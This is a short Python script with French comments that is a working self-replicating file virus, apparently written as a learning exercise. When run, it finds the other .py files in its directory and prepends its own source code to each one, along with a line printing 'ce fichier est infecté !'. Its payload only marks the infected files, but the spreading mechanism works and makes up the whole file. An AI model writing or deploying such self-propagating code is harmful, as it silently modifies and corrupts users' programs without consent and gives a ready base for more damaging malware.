#! /usr/bin/python3

import os

def print_in_file(fname, lignes) :
	with open(fname, 'w') as f :
		f.writelines(lignes)

def read(fname) :
	with open(fname, 'r') as f :
		lignes = f.readlines()
	return lignes

def insert_lines(fname, lignes) :
	new_lignes = lignes+read(fname)
	print_in_file(fname, new_lignes)

def insert_lines_in_list_of_files(l, lignes): 
	for f in l :
		insert_lines(f, lignes)



#Identifier les fichiers infectables
def get_dir() : #Récupérer le nom du répertoire courant
	path = __file__.split('/')
	return '/'.join(path[:-1])

def py_files() :
	fichiers = os.listdir(get_dir())
	py_files = []
	for f in fichiers :
		if f.endswith(".py") :
			py_files.append(f)
	py_files.remove(str(__file__.split('/')[-1]))
	return py_files

#Dupliquer son propre code
def get_code() :
	return read(__file__)

#Copier son code dans les programmes infectables
def infect() :
	insert_lines_in_list_of_files(py_files(), get_code()+list("\nprint('ce fichier est infecté !')\n"))


infect()







